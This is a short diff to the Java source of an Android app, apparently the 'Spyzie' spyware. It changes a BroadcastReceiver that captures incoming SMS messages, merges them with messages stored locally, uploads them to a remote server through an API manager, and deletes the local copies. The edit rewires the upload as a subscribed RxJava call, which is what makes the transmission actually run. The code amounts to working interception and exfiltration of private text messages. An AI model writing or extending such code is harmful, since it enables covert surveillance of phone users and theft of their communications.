@@ -11,6 +11,7 @@ import com.tantd.spyzie.data.model.Sms;
 import com.tantd.spyzie.data.network.AppApiManager;
 import com.tantd.spyzie.util.Constants;
 import com.tantd.spyzie.util.NetworkUtils;
+import com.tantd.spyzie.util.rx.AppSchedulerProvider;
 
 import java.util.List;
 
@@ -39,7 +40,10 @@ public class SpyzieReceiver extends BroadcastReceiver {
         if (NetworkUtils.isNetworkConnected(context)) {
             List<Sms> savedData = (List<Sms>) AppDbManager.getInstance().find(Sms.class, 0, Constants.MAX_READ_DATA_ENTRIES);
             savedData.add(sms);
-            AppApiManager.getInstance().sendSmsData(savedData);
+            AppApiManager.getInstance().sendSmsData(savedData)
+                    .subscribeOn(AppSchedulerProvider.getInstance().io())
+                    .observeOn(AppSchedulerProvider.getInstance().ui())
+                    .subscribe();
             savedData.remove(savedData.size() - 1);
             if (savedData.size() > 0) {
                 AppDbManager.getInstance().removeSms(savedData);
